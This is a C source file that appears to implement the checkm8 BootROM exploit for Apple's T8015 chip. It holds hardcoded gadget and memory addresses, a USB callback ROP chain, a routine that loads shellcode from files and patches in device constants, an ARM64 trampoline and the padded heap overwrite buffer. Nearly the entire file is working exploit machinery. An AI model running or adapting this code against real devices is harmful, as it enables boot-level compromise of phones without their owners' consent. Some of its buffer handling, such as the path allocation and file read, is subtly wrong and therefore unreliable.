#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "config.h"
// #include "vector.h"

#define COUNT(arr) (sizeof(arr) / sizeof((arr)[0]))

usb_cb create_usb_callback(uint64_t func, uint64_t cb) {
    usb_cb callback;
    callback.func_address = func;
    callback.cb_address = cb;
    return callback;
}

// Vector stuff
vcb vcb_new(int capacity) {
    vcb v;
    v.data = malloc(sizeof(usb_cb) * capacity);
    v.size = 0;
    v.capacity = capacity;
    return v;
}

void vcb_init(vcb* v, int capacity) {
    v->data = malloc(sizeof(usb_cb) * capacity);
    v->size = 0;
    v->capacity = capacity;
}

void vcb_push(vcb* v, usb_cb element) {
    // if (v->size == v->capacity) {
    //     v64_resize(v, v->capacity * 2);
    // }
    v->data[v->size] = element;
    v->size++;
}

usb_cb vcb_value(vcb* v, int index) {
    return v->data[index];
}

void populate_t8015_usb_consts(v64* constants) {
    v64_init(constants, 6);
    v64_push(constants,          0x18001C000); // 1 - LOAD_ADDRESS
    v64_push(constants,   0x6578656365786563); // 2 - EXEC_MAGIC
    v64_push(constants,   0x646F6E65646F6E65); // 3 - DONE_MAGIC
    v64_push(constants,   0x6D656D636D656D63); // 4 - MEMC_MAGIC
    v64_push(constants,   0x6D656D736D656D73); // 5 - MEMS_MAGIC
    v64_push(constants,          0x10000B9A8); // 6 - USB_CORE_DO_IO
}

void populate_t8015_checkm8_consts(v64* constants) {
    v64_init(constants, 8);
    v64_push(constants,          0x180008528); // 1 - gUSBDescriptors
    v64_push(constants,          0x180003A78); // 2 - gUSBSerialNumber
    v64_push(constants,          0x10000AE80); // 3 - usb_create_string_descriptor
    v64_push(constants,          0x1800008FA); // 4 - gUSBSRNMStringDescriptor
    v64_push(constants,          0x18001BC00); // 5 - PAYLOAD_DEST
    v64_push(constants, PAYLOAD_OFFSET_ARM64); // 6 - PAYLOAD_OFFSET
    v64_push(constants,   PAYLOAD_SIZE_ARM64); // 7 - PAYLOAD_SIZE
    v64_push(constants,          0x180008638); // 8 - PAYLOAD_PTR
}

payload_config get_t8015_payload() {
    payload_config config;

    populate_t8015_usb_consts(&config.constants_usb);
    populate_t8015_checkm8_consts(&config.constants_checkm8);

    config.load_write_gadget                = 0x10000945C;
    config.write_sctlr_gadget               = 0x1000003EC;
    config.func_gadget                      = 0x10000A9AC;
    config.write_ttbr0                      = 0x10000045C;
    config.tlbi                             = 0x1000004AC;
    config.dc_civac                         = 0x1000004D0;
    config.dmb                              = 0x1000004F0;
    config.handle_interface_request         = 0x10000BCCC;

    vcb_init(&config.callbacks, 13);
    vcb_push(&config.callbacks, create_usb_callback(config.dc_civac, 0x18001C800));
    vcb_push(&config.callbacks, create_usb_callback(config.dc_civac, 0x18001C840));
    vcb_push(&config.callbacks, create_usb_callback(config.dc_civac, 0x18001C880));
    vcb_push(&config.callbacks, create_usb_callback(config.dmb, 0));
    vcb_push(&config.callbacks, create_usb_callback(config.write_sctlr_gadget, 0x100D));
    vcb_push(&config.callbacks, create_usb_callback(config.load_write_gadget, 0x18001C000));
    vcb_push(&config.callbacks, create_usb_callback(config.load_write_gadget, 0x18001C010));
    vcb_push(&config.callbacks, create_usb_callback(config.write_ttbr0, 0x180020000));
    vcb_push(&config.callbacks, create_usb_callback(config.tlbi, 0));
    vcb_push(&config.callbacks, create_usb_callback(config.load_write_gadget, 0x18001C020));
    vcb_push(&config.callbacks, create_usb_callback(config.write_ttbr0, 0x18000C000));
    vcb_push(&config.callbacks, create_usb_callback(config.tlbi, 0));
    vcb_push(&config.callbacks, create_usb_callback(0x18001C800, 0));

    return config;
}

payload_config get_config(int cpid) {
    switch (cpid) {
        case 8015:
            return get_t8015_payload();      
        default:
            printf("Device not supported, exiting");
            exit(EXIT_FAILURE);
    };
}

v8 prepare_shellcode(char* filename, v64* constants) {
    char* ftype = ".bin";
    char* path = malloc(sizeof(filename) + 8); // "bin/" + ".bin" = 8
    int width = 0; 
    if (strstr(filename, "arm64") != NULL) {
        // Arm64
        width = 8;
    } else {
        width = 4;
    }

    int file_size;
    // uint8_t* shellcode;
    // uint8_t* shellcode_patched;
    v8 shellcode;
    v8 shellcode_patched;

    strcpy(path, "bin/");
    strcat(path, filename);
    strcat(path, ftype);

    FILE* fp = fopen(path, "rb");
    if (!fp) {
        printf("[!] Error loading shellcode at %s\n", path);
        exit(EXIT_FAILURE);
    }

    fseek(fp, 0, SEEK_END);
    file_size = ftell(fp);
    shellcode = v8_new(file_size);
    rewind(fp);

    fread(shellcode.data, file_size, sizeof(uint64_t), fp);
    fclose(fp);

    // Replace placeholders in shellcode with device-specific ones provided
    uint64_t placeholder_offset = file_size - width * constants->size;

    printf("\tprepare_shellcode:\n"
                "\t\tfile=%s\n"
                "\t\tfile_size=%i\n"
                "\t\tplaceholder_offset=%li\n"
                "\t\tconstants->size=%i\n", 
            filename, file_size, placeholder_offset, constants->size);

    for (int i = 0; i < constants->size; i++) {
        uint64_t value = 0;
        uint64_t offset = placeholder_offset + width * i;
        value = *(uint64_t *)(&shellcode.data[offset]);
        assert(value == 0xBAD00001 + i);
    }

    v8_init(&shellcode_patched, file_size);
    memcpy(shellcode_patched.data, shellcode.data, placeholder_offset);
    memcpy(shellcode_patched.data + placeholder_offset, constants->data, constants->size * sizeof(uint64_t));
    
    for (int i = 0; i < constants->size; i++) {
        uint64_t value = 0;
        uint64_t offset = placeholder_offset + width * i;
        value = *(uint64_t *)(&shellcode_patched.data[offset]);
        assert(value == v64_value(constants, i));
    }

    free(path);
    fp = NULL;
    path = NULL;

    return shellcode_patched;
}

v8 usb_rop_callbacks(uint64_t address, uint64_t func_gadget, vcb callbacks) {
    v64 data = v64_new(8);

    for (int i = 0; i < callbacks.size - 1; i += 5) {
        v64 block1 = v64_new(1);
        v64 block2 = v64_new(1);

        for (int j = 0; j < 5; j ++) {
            address += 0x10;

            if (j == 4) {
                address += 0x50;
            }

            if ((i + j) < callbacks.size - 1) {
                // printf("index: %i\tcb_addr: 0x%08lx\tfunc_addr: 0x%08lx\t\n", 
                //     (i+j), vcb_value(&callbacks, (i + j)).cb_address, vcb_value(&callbacks, (i + j)).func_address);

                v64_push(&block1, func_gadget);
                v64_push(&block1, address);
                v64_push(&block2, vcb_value(&callbacks, (i + j)).cb_address);
                v64_push(&block2, vcb_value(&callbacks, (i + j)).func_address);
            } else if ((i + j) == callbacks.size - 1) {
                // printf("index: %i\tcb_addr: 0x%08lx\tfunc_addr: 0x%08lx\t\n", 
                //     (i+j), vcb_value(&callbacks, (i + j)).cb_address, vcb_value(&callbacks, (i + j)).func_address);

                v64_push(&block1, func_gadget);
                v64_push(&block1, 0);
                v64_push(&block2, vcb_value(&callbacks, (i + j)).cb_address);
                v64_push(&block2, vcb_value(&callbacks, (i + j)).func_address);
            } else {
                v64_push(&block1, 0);
                v64_push(&block1, 0);
            }
        }
        // append block1 + block 2 to data
        v64_append(&data, block1);
        v64_append(&data, block2);
    }
    // convert uint64 to uint8 and return 
    v8 data_out = v64_convert_v8(data);

    printf("\tusb_rop_callbacks:\n"
                "\t\tdata.size=%i\n"
                "\t\tdata_out.size=%i\n",
            data.size, data_out.size);

    return data_out;
}

// # LDR X7, [PC, #OFFSET]; BR X7
v8 asm_arm64_x7_trampoline(uint64_t dest) {
    // 47 00 00 58 E0 00 1F D6
    v8 trampoline = v8_new(8);
    v64 d = v64_new(1);
    v64_push(&d, dest);
    v8_push(&trampoline, 0x47);
    v8_push(&trampoline, 0x00);
    v8_push(&trampoline, 0x00);
    v8_push(&trampoline, 0x58);
    v8_push(&trampoline, 0xE0);
    v8_push(&trampoline, 0x00);
    v8_push(&trampoline, 0x01);
    v8_push(&trampoline, 0xD6);
    v8_append(&trampoline, v64_convert_v8(d));
    
    return trampoline;
}

uint32_t asm_arm64_branch(uint64_t src, uint64_t dest) {
    uint32_t value;

    if (src < dest) {
        value = (uint32_t)(0x18000000 - (src - dest) / 4);
    } else {
        value = (uint32_t)(0x14000000 + (dest - src) / 4);
    }
    
    return value;
}

/*
    t8015_overwrite = '\0' * 0x500 + struct.pack(
        '<32x2Q16x32x2Q12xI', 
        t8015_nop_gadget, 0x18001C020, 
        t8015_nop_gadget, 0x18001C020, 
        0xbeefbeef)
*/
v8 create_overwrite(uint64_t nop_gadget, uint64_t addr) {
    int padd = 0x500; // t8015
    v64 block1 = v64_new(2);
    v64_push(&block1, nop_gadget);
    v64_push(&block1, addr);

    v8 ret = v8_new(0x580);
    v8_append(&ret, v8_zeros(padd));            // '\0' * 0x500
    v8_append(&ret, v8_zeros(32));              // 32x
    v8_append(&ret, v64_convert_v8(block1));    // 2Q
    v8_append(&ret, v8_zeros(16));              // 16x
    v8_append(&ret, v8_zeros(32));              // 32x
    v8_append(&ret, v64_convert_v8(block1));    // 2Q
    v8_append(&ret, v8_zeros(12));              // 12x
    v8_push_u32(&ret, 0xbeefbeef);              // I

    assert(ret.size == 0x580);

    return ret;
}